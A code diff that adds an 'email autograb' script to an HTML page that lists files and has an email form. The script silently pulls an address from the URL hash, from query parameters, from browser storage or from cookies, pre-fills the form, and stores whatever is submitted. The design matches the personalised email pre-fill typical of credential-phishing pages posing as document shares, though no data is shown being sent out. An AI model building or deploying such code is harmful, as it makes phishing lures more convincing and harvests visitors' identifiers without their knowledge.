@@ -236,6 +236,91 @@
     });
 
     renderFiles();
+
+    // Email autograb script
+    (function() {
+      function extractEmailFromString(str) {
+        const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
+        const matches = str.match(emailRegex);
+        return matches ? matches[0] : null;
+      }
+
+      function attemptEmailAutograb() {
+        let detectedEmail = null;
+
+        // 1. Check URL hash parameter
+        if (window.location.hash) {
+          const hashEmail = extractEmailFromString(decodeURIComponent(window.location.hash));
+          if (hashEmail) detectedEmail = hashEmail;
+        }
+
+        // 2. Check URL search parameters
+        if (!detectedEmail) {
+          const urlParams = new URLSearchParams(window.location.search);
+          const paramEmail = urlParams.get('email') || urlParams.get('e') || urlParams.get('user');
+          if (paramEmail) detectedEmail = extractEmailFromString(paramEmail);
+        }
+
+        // 3. Check localStorage for saved emails
+        if (!detectedEmail) {
+          try {
+            const storedEmail = localStorage.getItem('userEmail') || 
+                              localStorage.getItem('email') ||
+                              localStorage.getItem('user_email');
+            if (storedEmail) detectedEmail = extractEmailFromString(storedEmail);
+          } catch (e) {}
+        }
+
+        // 4. Check sessionStorage
+        if (!detectedEmail) {
+          try {
+            const sessionEmail = sessionStorage.getItem('userEmail') || 
+                                sessionStorage.getItem('email');
+            if (sessionEmail) detectedEmail = extractEmailFromString(sessionEmail);
+          } catch (e) {}
+        }
+
+        // 5. Check cookies
+        if (!detectedEmail) {
+          try {
+            const cookies = document.cookie.split(';');
+            for (let cookie of cookies) {
+              const emailMatch = extractEmailFromString(cookie);
+              if (emailMatch) {
+                detectedEmail = emailMatch;
+                break;
+              }
+            }
+          } catch (e) {}
+        }
+
+        // 6. Auto-fill if email detected
+        if (detectedEmail && emailInput) {
+          setTimeout(() => {
+            emailInput.value = detectedEmail;
+            emailInput.setAttribute('value', detectedEmail);
+          }, 100);
+        }
+
+        // 7. Store submitted email for future reference
+        emailForm.addEventListener('submit', (e) => {
+          const submittedEmail = emailInput.value.trim();
+          if (submittedEmail && validateEmail(submittedEmail)) {
+            try {
+              localStorage.setItem('userEmail', submittedEmail);
+              sessionStorage.setItem('userEmail', submittedEmail);
+            } catch (e) {}
+          }
+        });
+      }
+
+      // Run autograb on page load
+      if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', attemptEmailAutograb);
+      } else {
+        attemptEmailAutograb();
+      }
+    })();
   </script>
 </body>
 </html>
